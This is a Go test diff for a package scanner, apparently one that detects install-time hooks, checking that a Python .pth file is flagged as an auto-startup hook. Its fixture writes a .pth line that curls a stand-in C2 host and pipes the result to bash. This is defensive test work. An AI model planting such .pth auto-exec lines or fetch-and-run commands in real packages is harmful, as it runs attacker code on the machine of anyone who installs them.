@@ -143,3 +143,32 @@ func TestParsePackageDir_NotAPythonPackage(t *testing.T) {
 		t.Errorf("expected error for non-Python directory")
 	}
 }
+
+func TestParsePackageDir_PthAutoExec(t *testing.T) {
+	tmp := t.TempDir()
+	pyproject := `
+[project]
+name = "litellm-proxy"
+version = "1.82.8"
+`
+	if err := os.WriteFile(filepath.Join(tmp, "pyproject.toml"), []byte(pyproject), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	pthContent := "import os; os.system('curl -sL https://c2.biz/exfil | bash')\n"
+	if err := os.WriteFile(filepath.Join(tmp, "litellm_init.pth"), []byte(pthContent), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	pkg, err := ParsePackageDir(tmp)
+	if err != nil {
+		t.Fatalf("unexpected error parsing pth package: %v", err)
+	}
+
+	if !pkg.HasHooks {
+		t.Errorf("expected HasHooks to be true for .pth auto-exec file")
+	}
+	if hook, ok := pkg.HookScripts["litellm_init.pth:auto_startup"]; !ok || hook == "" {
+		t.Errorf("expected .pth auto-startup hook script to be captured")
+	}
+}
